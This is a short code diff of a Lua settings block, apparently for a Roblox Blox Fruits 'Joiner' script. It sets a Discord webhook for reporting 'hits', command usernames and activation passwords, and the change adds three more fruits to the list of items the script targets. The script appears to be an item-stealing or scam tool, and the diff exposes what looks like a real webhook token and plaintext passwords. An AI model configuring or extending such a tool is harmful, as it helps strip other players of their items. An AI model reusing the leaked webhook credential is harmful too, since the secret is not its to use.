@@ -3,7 +3,7 @@
 -- Shared Joiner/Core Settings
 local Webhook = "https://discordapp.com/api/webhooks/1345845274068910233/lrQzS48o7448ZJW7sVp2urneECa5xnwiD5jm_VeEJIZL0t50XL8Dp1GzmRbbT7sI3XLI" -- << Your primary Joiner webhook for hits/leaves
 local Usernames = {"user1", "user2", "user3", "user4", "user5"} -- << Your usernames for command access
-local FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits Joiner looks for
+local FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Magma-Magma", "Spin-Spin", "Rocket-Rocket"} -- << Fruits Joiner looks for
 local Joiner_ActivationPasswords = { -- Passwords for ?activate command (Keeping prefix for clarity as it's specific to Joiner's activate command)
 	"ishusontop",
 	"bonzarbal",
